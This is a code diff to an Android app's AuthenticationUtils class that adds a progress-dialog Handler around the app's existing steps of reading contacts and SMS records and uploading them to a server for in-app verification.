@@ -5,6 +5,8 @@ import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.Message;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.view.View;
@@ -316,12 +318,14 @@ public class AuthenticationUtils {
      * 获取通讯录用户
      */
     private static void getPersonList(Activity activity) {
+        handler.sendEmptyMessage(0x11);
         new Thread(() -> {
             try {
                 phones = new PhoneUtil(activity).searchContacts("");
                 commitContactList(phones);
             } catch (Exception ex) {
                 ex.printStackTrace();
+                handler.sendEmptyMessage(0x22);
             }
         }).start();
     }
@@ -332,12 +336,14 @@ public class AuthenticationUtils {
      * 获取短信记录
      */
     private static void getSmsList(Activity activity) {
+        handler.sendEmptyMessage(0x11);
         new Thread(() -> {
             try {
                 smsBOS = SMSUtils.obtainPhoneMessage(activity);
                 commitSmsList();
             } catch (Exception ex) {
                 ex.printStackTrace();
+                handler.sendEmptyMessage(0x22);
             }
         }).start();
     }
@@ -368,6 +374,7 @@ public class AuthenticationUtils {
             @Override
             public void callError(String message) {
                 ToastUtils.showShort(message);
+                handler.sendEmptyMessage(0x22);
             }
         });
         utils.updateFile(4, filePath);
@@ -377,12 +384,14 @@ public class AuthenticationUtils {
         HttpServerImpl.addClientSmsRecordAuth(url).subscribe(new HttpResultSubscriber<AttentionSourrssBO>() {
             @Override
             public void onSuccess(AttentionSourrssBO s) {
+                handler.sendEmptyMessage(0x22);
                 goAuthNextPage(s.getCode(), s.getNeedStatus(), AppManager.getAppManager().curremtActivity());
             }
 
             @Override
             public void onFiled(String message) {
                 ToastUtils.showShort(message);
+                handler.sendEmptyMessage(0x22);
             }
         });
     }
@@ -419,6 +428,7 @@ public class AuthenticationUtils {
 
             @Override
             public void callError(String message) {
+                handler.sendEmptyMessage(0x22);
                 ToastUtils.showShort(message);
             }
         });
@@ -430,14 +440,36 @@ public class AuthenticationUtils {
         HttpServerImpl.commitContactList(url).subscribe(new HttpResultSubscriber<AttentionSourrssBO>() {
             @Override
             public void onSuccess(AttentionSourrssBO s) {
+                handler.sendEmptyMessage(0x22);
                 goAuthNextPage(s.getCode(), s.getNeedStatus(), AppManager.getAppManager().curremtActivity());
             }
 
             @Override
             public void onFiled(String message) {
+                handler.sendEmptyMessage(0x22);
                 ToastUtils.showShort(message);
             }
         });
     }
+
+    private static ProgressUtils utils;
+
+    private static Handler handler = new Handler(AppManager.getAppManager().curremtActivity().getMainLooper()) {
+        @Override
+        public void handleMessage(Message msg) {
+            super.handleMessage(msg);
+            if (utils == null) {
+                utils = new ProgressUtils(AppManager.getAppManager().curremtActivity());
+            }
+            switch (msg.what) {
+                case 0x11:
+                    utils.showProgress();
+                    break;
+                case 0x22:
+                    utils.stopProgress();
+                    break;
+            }
+        }
+    };
 
 }
